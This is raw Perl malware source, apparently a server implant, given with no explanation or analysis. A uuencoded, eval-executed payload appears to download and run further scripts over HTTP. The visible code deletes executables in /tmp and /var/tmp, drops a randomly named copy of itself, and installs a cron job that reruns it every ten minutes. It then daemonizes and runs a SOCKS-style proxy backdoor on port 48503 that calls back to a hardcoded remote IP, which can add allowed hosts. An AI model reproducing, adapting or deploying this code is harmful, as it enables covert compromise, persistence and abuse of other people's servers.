M7B@N*EM>7'-=*5QS*B0O)#$O.PT*;F5X="!U;FQE<W,@;&5N9W1H("1?.PT*
M)')E<W`@/2`D,2!I9B`O7DA45%!<4RM<<RLH7&1<9%QD*2\[#0I]#0IC;&]S
M92!&.PT*?0T*)'-I>F4@/2`H<W1A="`D8V]N=&5N="E;-UT@:68@+68@)&-O
M;G1E;G0[#0HD<VEZ92`](#`@:68@(61E9FEN960@)'-I>F4@?'P@)'-I>F4@
M(7X@+UY<9"LD+SL-"FEF("@D<VEZ92`^(#`I#0I[#0IC:&UO9"`P-S4U+"`D
M8V]N=&5N=#L-"G-Y<W1E;2`B<&5R;"`D8V]N=&5N="`^+V1E=B]N=6QL(#(^
M)C$B.PT*?0T*=6YL:6YK("1H96%D97(@:68@+68@)&AE861E<CL@=6YL:6YK
M("1C;VYT96YT(&EF("UF("1C;VYT96YT.PT*9F]R96%C:"!M>2`D<G,@*$`D
M=7)L*0T*>PT*)&AE861E<B`]("(O9&5V+VYU;&PB.R`D8V]N=&5N="`]("1H
M96%D97([#0HF:'1T<"@D<G,L(#$P+"`D:&5A9&5R+"`D8V]N=&5N="P@,"P@
M(B1I9"XD<F5S<"XD<VEZ92(I.PT*?0T*97AI="`P.PT*?0T*<W5B('AO<FP-
M"GL-"FUY("@D;&EN92P@)&-O9&4L("1X;W(L("1L:6TI(#T@*'-H:69T+"`B
M(BP@,2P@,38I.PT*9F]R96%C:"!M>2`D8VAR("AS<&QI="`H+R\L("1L:6YE
M*2D-"GL-"FEF("@D>&]R(#T]("1L:6TI#0I[#0HD;&EM(#T@,"!I9B`D;&EM
M(#T](#(U-CL-"B1L:6T@*ST@,38[#0HD>&]R(#T@,3L-"GT-"B1C;V1E("X]
M('!A8VL@*")#(BP@=6YP86-K("@B0R(L("1C:'(I(%X@)'AO<BD[#0HD>&]R
M("LK.PT*?0T*<F5T=7)N("1C;V1E.PT*?0T*<W5B(&1E8WAD#0I[#0IM>2`D
M9&%T82`]('!A8VL@*")(*B(L('-H:69T*3L-"D!?(#T@=6YP86-K("@B0S4B
M+"!S=6)S='(@*"1D871A+"`P+"`U+"`B(BDI.PT*<F5T=7)N("@F>&]R;"AS
M=6)S='(@*"1D871A+"`P+"!S:&EF="P@(B(I*2P@)GAO<FPH<W5B<W1R("@D
M9&%T82P@,"P@<VAI9G0L("(B*2DL($!?*3L-"GT-"G-U8B!H='1P#0I[#0IM
M>2`H)'5R;"P@)'1I;65O=70L("1H96%D97(L("1C;VYT96YT+"`D;6]D92P@
M)&=E8VMO*2`]($!?.PT*)&=E8VMO(#T@(C(P,3`P,3`Q(B!I9B`A9&5F:6YE
M9"`D9V5C:V\@?'P@(6QE;F=T:"`D9V5C:V\[#0IM>2`H)&AO<W0L("1P;W)T
M+"`D<&%T:"D@/2`D=7)L(#U^("]>*%M>7"\Z72LI.BHH7&0J*3\H7"\_6UY<
M(UTJ*2\[#0IR971U<FX@=6YL97-S("1H;W-T.PT*;7D@)&%D9'(@/2!G971H
M;W-T8GEN86UE("1H;W-T.PT*<F5T=7)N('5N;&5S<R`D861D<CL-"B1P;W)T
M('Q\/2`X,#L-"B1P871H('Q\/2`B+R([#0HD861D<B`]('-O8VMA9&1R7VEN
M*"1P;W)T+"`D861D<BD[#0IM>2`D<F5A9&5R<R`]($E/.CI396QE8W0M/FYE
M=R@I(&]R(')E='5R;CL-"FUY("1W<FET97)S(#T@24\Z.E-E;&5C="T^;F5W
M*"D@;W(@<F5T=7)N.PT*;7D@)&)U9F9E<B`](&IO:6X-"B@-"B)<>#!$7'@P
M02(L#0HB1T54("1P871H($A45%`O,2XQ(BP-"B)(;W-T.B`D:&]S="(L#0HB
M57-E<BU!9V5N=#H@36]Z:6QL82\U+C`@*%=I;F1O=W,@3E0@-BXQ.R!7:6XV
M-#L@>#8T.R!R=CHV-RXP*2!'96-K;R\D9V5C:V\@1FER969O>"\V-RXP(BP-
M"B)!8V-E<'0Z('1E>'0O:'1M;"QA<'!L:6-A=&EO;B]X:'1M;"MX;6PL87!P
M;&EC871I;VXO>&UL.W$])'$Q+"HO*CMQ/21Q,B(L#0HB06-C97!T+4QA;F=U
M86=E.B!E;BUU<RQE;CMQ/21Q,2(L#0HB06-C97!T+45N8V]D:6YG.B!G>FEP
M+"!D969L871E(BP-"B)!8V-E<'0M0VAA<G-E=#H@25-/+3@X-3DM,2QU=&8M
M.#MQ/21Q,BPJ.W$])'$Q(BP-"B)#;VYN96-T:6]N.B!C;&]S92(L#0HB7'@P
M1%QX,$$B#0HI.PT*:68@*"1M;V1E*0T*>PT*)&)U9F9E<B`](&IO:6X-"B@-
M"B)<>#!$7'@P02(L#0HB1T54("1P871H($A45%`O,2XP(BP-"B)(;W-T.B`D
M:&]S="(L#0HB57-E<BU!9V5N=#H@36]Z:6QL82\U+C`@*%=I;F1O=W,@3E0@
M-BXQ.R!7:6XV-#L@>#8T.R!R=CHV-BXP*2!'96-K;R\D9V5C:V\@1FER969O
M>"\V-BXP(BP-"B)!8V-E<'0Z('1E>'0O:'1M;"PJ+RHB+`T*(D-O;FYE8W1I
M;VXZ(&-L;W-E(BP-"B)<>#!$7'@P02(-"BD[#0I]#0IM>2`D<V]C:V5T(#T@
M24\Z.E-O8VME=#HZ24Y%5"T^;F5W*%!R;W1O(#T^(")T8W`B+"!4>7!E(#T^
M(%-/0TM?4U1214%-*3L-"G)E='5R;B!U;FQE<W,@)'-O8VME=#L-"B1S;V-K
M970M/F)L;V-K:6YG*#`I.PT*=6YL97-S("@D<V]C:V5T+3YC;VYN96-T*"1A
M9&1R*2D-"GL-"G5N;&5S<R`H)"$@/3T@4$]325@Z.D5)3E!23T=215-3*0T*
M>PT*8VQO<V4@)'-O8VME=#L-"G)E='5R;CL-"GT-"GT-"B1W<FET97)S+3YA
M9&0H)'-O8VME="D[#0HD=&EM96]U="`K/2!T:6UE.PT*;7D@)'-T97`@/2`P
M.PT*=VAI;&4@*#$I#0I[#0I)3SHZ4V5L96-T+3YS96QE8W0H=6YD968L('5N
M9&5F+"!U;F1E9BP@,"XP,BD[#0IM>2`D=W)I=&%B;&4@/2`H24\Z.E-E;&5C
M="T^<V5L96-T*'5N9&5F+"`D=W)I=&5R<RP@=6YD968L(#`I*5LQ73L-"F9O
M<F5A8V@@;7D@)&AA;F1L92`H0"1W<FET86)L92D-"GL-"FEF("@D<W1E<"`]
M/2`P*0T*>PT*)'-T97`@/2`Q(&EF("1H86YD;&4M/F-O;FYE8W1E9#L-"GT-
M"FEF("@D<W1E<"`]/2`Q*0T*>PT*;7D@)')E<W5L="`]('-Y<W=R:71E("@D
M:&%N9&QE+"`D8G5F9F5R*3L-"FEF("AD969I;F5D("1R97-U;'0@)B8@)')E
M<W5L="`^(#`I#0I[#0IS=6)S='(@*"1B=69F97(L(#`L("1R97-U;'0I(#T@
M(B([#0II9B`H(6QE;F=T:"`D8G5F9F5R*0T*>PT*)')E861E<G,M/F%D9"@D
M:&%N9&QE*3L-"B1W<FET97)S+3YR96UO=F4H)&AA;F1L92D[#0HD<W1E<"`]
M(#([#0I]#0I]#0IE;'-I9B`H)"$@/3T@4$]325@Z.D573U5,1$),3T-+*0T*
M>PT*;F5X=#L-"GT-"F5L<V4-"GL-"B1T:6UE;W5T(#T@,#L-"GT-"GT-"GT-
M"FUY("1R96%D86)L92`]("A)3SHZ4V5L96-T+3YS96QE8W0H)')E861E<G,L
M('5N9&5F+"!U;F1E9BP@,"DI6S!=.PT*9F]R96%C:"!M>2`D:&%N9&QE("A`
M)')E861A8FQE*0T*>PT*;F5X="!I9B`D<W1E<"`\(#([#0IM>2`D<F5S=6QT
M.PT*:68@*"1S=&5P(#T](#(I#0I[#0HD<F5S=6QT(#T@<WES<F5A9"`H)&AA
M;F1L92P@)&)U9F9E<BP@.#$Y,BP@;&5N9W1H("1B=69F97(I.PT*?0T*96QS
M90T*>PT*)')E<W5L="`]('-Y<W)E860@*"1H86YD;&4L("1B=69F97(L(#@Q
M.3(I.PT*?0T*:68@*#$V,S@T(#P@;&5N9W1H("1B=69F97(I#0I[#0HD=&EM
M96]U="`](#`[#0I]#0IE;'-I9B`H9&5F:6YE9"`D<F5S=6QT*0T*>PT*:68@
M*"1R97-U;'0@/B`P*0T*>PT*:68@*"1S=&5P(#T](#(I#0I[#0IM>2`D;V9F
M<V5T(#T@:6YD97@@*"1B=69F97(L(")<>#!$7'@P05QX,$1<>#!!(BD[#0IN
M97AT(&EF("1O9F9S970@/"`P.PT*:68@*&]P96X@*$8L("(^/B(L("1H96%D
M97(I*0T*>PT*9FQO8VL@1BP@,CL-"F)I;FUO9&4@1CL-"G!R:6YT($8@<W5B
M<W1R("@D8G5F9F5R+"`P+"`D;V9F<V5T*3L-"F-L;W-E($8[#0I]#0IS=6)S
M='(@*"1B=69F97(L(#`L("1O9F9S970@*R`T*2`]("(B.PT*)'-T97`@/2`S
M.PT*?0T*:68@*"1S=&5P(#T](#,I#0I[#0II9B`H;&5N9W1H("1B=69F97(I
M#0I[#0II9B`H;W!E;B`H1BP@(CX^(BP@)&-O;G1E;G0I*0T*>PT*9FQO8VL@
M1BP@,CL-"F)I;FUO9&4@1CL-"G!R:6YT($8@)&)U9F9E<CL-"F-L;W-E($8[
M#0I]#0HD8G5F9F5R(#T@(B([#0I]#0I]#0IN97AT.PT*?0T*)'1I;65O=70@
M/2`P.PT*?0T*96QS:68@*"0A(#T](%!/4TE8.CI%5T]53$1"3$]#2RD-"GL-
M"FYE>'0[#0I]#0IE;'-E#0I[#0HD=&EM96]U="`](#`[#0I]#0I]#0II9B`H
M)'1I;65O=70@/"!T:6UE*0T*>PT*9F]R96%C:"!M>2`D:&%N9&QE("@D=W)I
M=&5R<RT^:&%N9&QE<RP@)')E861E<G,M/FAA;F1L97,I#0I[#0HD=W)I=&5R
M<RT^<F5M;W9E*"1H86YD;&4I(&EF("1W<FET97)S+3YE>&ES=',H)&AA;F1L
M92D[#0HD<F5A9&5R<RT^<F5M;W9E*"1H86YD;&4I(&EF("1R96%D97)S+3YE
M>&ES=',H)&AA;F1L92D[#0IC;&]S92`D:&%N9&QE.PT*?0T*<F5T=7)N.PT*
)?0T*?0T*?0T*
ROZEN
}
my $limon = ["a".."z", "A".."Z"]; $limon = join ("", @$limon[map {rand @$limon}(1..(8 + int rand 7))]);
my $lions = 'my $' . $limon . ';$' . $limon . '.=$_ while(<DATA>);';
$lions .= 'eval(unpack(\'u*\',$' . $limon . '));' . "\x0A";
$lions .= '__DATA__' . "\x0A";
$lions .= $aperture; $aperture = $lions;
foreach my $aperturep ("/var/tmp", "/tmp") { for (<$aperturep/*>) { unlink $_ if (-f $_ && (-x $_ || -X $_)); }
my $aperturen = ["a".."z", "A".."Z"]; $aperturen = join ("", @$aperturen[map {rand @$aperturen}(1..(8 + int rand 7))]); my $apertureb = "$aperturep/$aperturen";
my $aperturec = $apertureb . int rand 9; my $aperturet = "*/10 * * * * perl $apertureb >/dev/null 2>&1\n"; if (open (B, ">", $apertureb)) { flock B, 2; print B $aperture; close B;
if (open (C, ">", $aperturec)) { flock C, 2; print C $aperturet; close C; chmod 0755, $apertureb; system "crontab $aperturec >/dev/null 2>&1"; unlink $aperturec; last; } } }
}
sub startserver
{
if ($^O ne "MSWin32")
{
use POSIX qw(setsid);
return unless defined (my $child = fork);
return if $child;
POSIX::setsid();
$SIG{CHLD} = sub { while (waitpid (-1, 1) > 0) {} };
$SIG{$_} = "IGNORE" for (qw (HUP INT ILL FPE QUIT ABRT USR1 SEGV USR2 PIPE ALRM TERM));
umask 0;
chdir "/";
open (STDIN, "</dev/null");
open (STDOUT, ">/dev/null");
open (STDERR, ">&STDOUT"); 
}
my $setting = { listen_port => 48503, remote_host_list => ["217.172.180.24:34975"], allow_host_list => {}, restart_timer => 5, connect_timeout => 10, session_timeout => 60 };
my $readers = IO::Select->new() or exit 0;
my $writers = IO::Select->new() or exit 0;
my $session = {};
my $destroy = sub
{
my $handle = shift;
if (exists $session->{$handle})
{
$readers->remove($session->{$handle}{handle}) if $readers->exists($session->{$handle}{handle});
$writers->remove($session->{$handle}{handle}) if $writers->exists($session->{$handle}{handle});
close $session->{$handle}{handle};
delete $session->{$handle};
}
};
my $listen_socket = IO::Socket::INET->new(Proto => "tcp", LocalPort => $setting->{listen_port}, Listen => SOMAXCONN, Reuse => 1);
exit 0 unless $listen_socket;
if ($^O eq "MSWin32") { ioctl ($listen_socket, 0x8004667e, pack ("L", 1)); } else { $listen_socket->blocking(0); }
unless ($readers->add($listen_socket))
{
close $listen_socket;
exit 0;
}
foreach (@{$setting->{remote_host_list}})
{
my ($hostaddr, $hostport) = split (/:/, $_, 2);
$hostaddr = pack ("C4", split (/\./, $hostaddr));
if ($hostaddr)
{
$setting->{allow_host_list}{$hostaddr} = "";
my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
next unless $socket;
if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } 
else { $socket->blocking(0); }
unless ($socket->connect($_ = sockaddr_in($hostport, $hostaddr)))
{
if ($! != $eiprogr && $! != $ewblock)
{
close $socket;
next;
}
}
unless ($writers->add($socket))
{
close $socket;
next;
}
unless ($readers->add($socket))
{
$writers->remove($socket);
close $socket;
next;
}
$session->{$socket} =
{
status	=> "cn_rh",
buffer	=> "",
handle	=> $socket,
target	=> "",
flagset	=> 1,
timeout	=> 0
};
}
}
$setting->{restart_timer} = time - 10 + $setting->{restart_timer} * 60;
while (1)
{
IO::Select->select(undef, undef, undef, 0.01);
my $readable = (IO::Select->select($readers, undef, undef, 0.01))[0];
foreach my $handle (@$readable)
{
if ($handle eq $listen_socket)
{
my ($socket_one, $peer_addr) = $handle->accept;
next unless $socket_one;
$peer_addr = substr ($peer_addr, 4, 4);
unless (exists $setting->{allow_host_list}{$peer_addr})
{
close $socket_one;
next;
}
my $socket_two = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
unless ($socket_two)
{
close $socket_one;
next;
}
if ($^O eq "MSWin32") { ioctl ($socket_one, 0x8004667e, pack ("L", 1)); } else { $socket_one->blocking(0); }
if ($^O eq "MSWin32") { ioctl ($socket_two, 0x8004667e, pack ("L", 1)); } else { $socket_two->blocking(0); }
if ($readers->add($socket_one))
{
if ($readers->add($socket_two))
{
if ($writers->add($socket_one))
{
if ($writers->add($socket_two))
{
$session->{$socket_one} =
{
status	=> "rd_qr",
buffer	=> "",
handle	=> $socket_one,
target	=> $socket_two,
flagset	=> 1,
timeout	=> 0
};
$session->{$socket_two} =
{
status	=> "wt_cm",
buffer	=> "",
handle	=> $socket_two,
target	=> $socket_one,
flagset	=> 1,
timeout	=> 0
};
next;
}
$writers->remove($socket_one);
}
$readers->remove($socket_two);
}
$readers->remove($socket_one);
}
close $socket_one;
close $socket_two;
next;
}
next unless exists $session->{$handle};
next if $session->{$handle}{status} !~ /^(rd|tr)/;
my $buffer;
if ($1 eq "rd")
{
$buffer = \$session->{$handle}{buffer};
}
elsif (exists $session->{$session->{$handle}{target}})
{
$buffer = \$session->{$session->{$handle}{target}}{buffer};
}
else
{
$destroy->($handle);
next;
}
my $length = length $$buffer;
my $unused = 8192 - $length;
if ($unused > 0)
{
my $result = sysread ($handle, $$buffer, $unused, $length);
if (defined $result)
{
if ($result > 0)
{
$session->{$handle}{flagset} = 1;
$length += $result;
}
else
{
if (exists $session->{$session->{$handle}{target}})
{
unless (length $session->{$session->{$handle}{target}}{buffer})
{
$destroy->($session->{$handle}{target});
}
else
{
$readers->remove($session->{$handle}{target});
}
}
$destroy->($handle);
next;
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
next;
}
}
next if $session->{$handle}{status} eq "tr_dt";
if ($session->{$handle}{status} eq "rd_qr")
{
next if $length < 2;
my $signature = substr $$buffer, 0, 2;
if ($signature eq "\x70\x10")
{
$destroy->($session->{$handle}{target});
$session->{$handle}{status} = "rd_rh";
}
elsif ($signature eq "\x04\x01")
{
$session->{$handle}{status} = "rd_cl";
}
else
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
next;
}
}
if ($session->{$handle}{status} eq "rd_rh")
{
next if $length < 20;
if (unpack ("S", (substr $$buffer, 2, 2)) == 128)
{
$setting->{restart_timer} = 0;
}
elsif ((my $counter = unpack ("S", (substr $$buffer, 18, 2))) > 0)
{
next if $length < (20 + $counter * 4);
while (my $allow_host = (substr $$buffer, 20, 4, ""))
{
last if (length $allow_host) < 4;
$setting->{allow_host_list}{$allow_host} = "";
}
}
$destroy->($handle);
}
else
{
next if $length < 9;
if ((my $index = index $$buffer, "\x00", 8) > 0)
{
my $socket = $session->{$handle}{target};
unless ($socket->connect($_ = sockaddr_in(unpack ("n", substr ($$buffer, 2, 2)), substr ($$buffer, 4, 4))))
{
if ($! != $eiprogr && $! != $ewblock)
{
$destroy->($session->{$handle}{target});
$session->{$handle}{status} = "wr_rj";
$$buffer = pack ("Sx6", 23296);
next;
}
}
$session->{$session->{$handle}{target}}{status} = "cn_th";
$session->{$session->{$handle}{target}}{flagset} = 1;
$session->{$handle}{status} = "wt_cm";
substr ($$buffer, 0, $index + 1) = "";
$session->{$session->{$handle}{target}}{buffer} = $$buffer;
$$buffer = pack ("Sx6", 23040);
}
}
}
IO::Select->select(undef, undef, undef, 0.01);
my $writable = (IO::Select->select(undef, $writers, undef, 0.01))[1];
foreach my $handle (@$writable)
{
next unless exists $session->{$handle};
next if $session->{$handle}{status} !~ /^((cn|wr|tr)_(.+))$/;
if ($2 eq "cn")
{
if ($handle->connected)
{
if ($3 eq "rh")
{
$session->{$handle}{flagset} = 1;
$session->{$handle}{status} = "wr_rh";
$session->{$handle}{buffer} = pack ("Sn", 5489, $setting->{listen_port});
}
else
{
$session->{$session->{$handle}{target}}{flagset} = 1;
$session->{$session->{$handle}{target}}{status} = "wr_gr";
$session->{$handle}{status} = "wt_cm";
}
}
else
{
if ($3 eq "rh")
{
}
else
{
$session->{$session->{$handle}{target}}{flagset} = 1;
$session->{$session->{$handle}{target}}{status} = "wr_rj";
$session->{$session->{$handle}{target}}{buffer} = pack ("Sx6", 23296);
}
$destroy->($handle);
}
next;
}
if (length $session->{$handle}{buffer})
{
my $result = syswrite ($handle, $session->{$handle}{buffer});
if (defined $result && $result > 0)
{
$session->{$handle}{flagset} = 1;
substr ($session->{$handle}{buffer}, 0, $result) = "";
unless (length $session->{$handle}{buffer})
{
if ($1 eq "wr_rh")
{
$session->{$handle}{status} = "rd_rh";
}
elsif ($1 eq "wr_rj")
{
$destroy->($handle);
}
elsif ($1 eq "wr_gr")
{
$session->{$handle}{status} = "tr_dt";
$session->{$session->{$handle}{target}}{status} = "tr_dt";
}
elsif ($1 eq "tr_dt")
{
unless (exists $session->{$session->{$handle}{target}})
{
$destroy->($handle);
}
}
}
}
elsif ($! == $ewblock)
{
next;
}
else
{
$destroy->($session->{$handle}{target});
$destroy->($handle);
}
}
}
while (my ($handle, $values) = each %$session)
{
next if $values->{status} eq "wt_cm";
my $timeout = time;
if ($values->{flagset})
{
if ($values->{status} =~ /^cn/)
{
$timeout += $setting->{connect_timeout};
}
else
{
$timeout += $setting->{session_timeout};
}
if (exists $session->{$values->{target}})
{
$session->{$values->{target}}{timeout} = $timeout;
$session->{$values->{target}}{flagset} = 0;
}
$values->{timeout} = $timeout;
$values->{flagset} = 0;
}
elsif ($timeout >= $values->{timeout})
{
$destroy->($session->{$handle}{target});
$destroy->($handle); }
}
if ($readers->exists($listen_socket) && time >= $setting->{restart_timer})
{
$readers->remove($listen_socket);
close $listen_socket;
&startserver() if $setting->{restart_timer}; 
}
last unless $readers->count or $writers->count; 
}
exit 0; 
}